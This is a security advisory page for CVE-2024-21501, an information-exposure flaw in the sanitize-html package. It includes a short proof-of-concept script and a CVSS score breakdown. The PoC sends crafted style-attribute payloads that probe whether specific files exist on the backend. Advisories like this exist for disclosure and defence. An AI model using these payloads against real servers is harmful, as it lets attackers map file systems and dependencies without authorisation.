### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.

#### Introduced: 20 Feb 2024

[CVE-2024-21501  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21501) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-200  (opens in a new tab)](https://cwe.mitre.org/data/definitions/200.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses
## How to fix?

There is no fixed version for `org.webjars.npm:sanitize-html`.

## Overview

Affected versions of this package are vulnerable to Information Exposure when used on the backend and with the `style` attribute allowed, allowing enumeration of files in the system (including project dependencies). An attacker could exploit this vulnerability to gather details about the file system structure and dependencies of the targeted server.

## PoC

```
// index.js
const sanitizeHtml = require('sanitize-html');

const file_exist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/sanitize-html/index.js */");'>@slonser_</a>`;
const file_notexist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/randomlibrary/index.js */");'>@slonser_</a>`;

const file_exist_clean = sanitizeHtml(file_exist, {
allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})

const file_notexist_clean = sanitizeHtml(file_notexist, {
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})
console.log(file_exist_clean, "// valid file path on backend")
console.log(file_notexist_clean, "// invalid file path on backend")

```

### CVSS Scores

version 3.1
### Snyk

5.3 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**
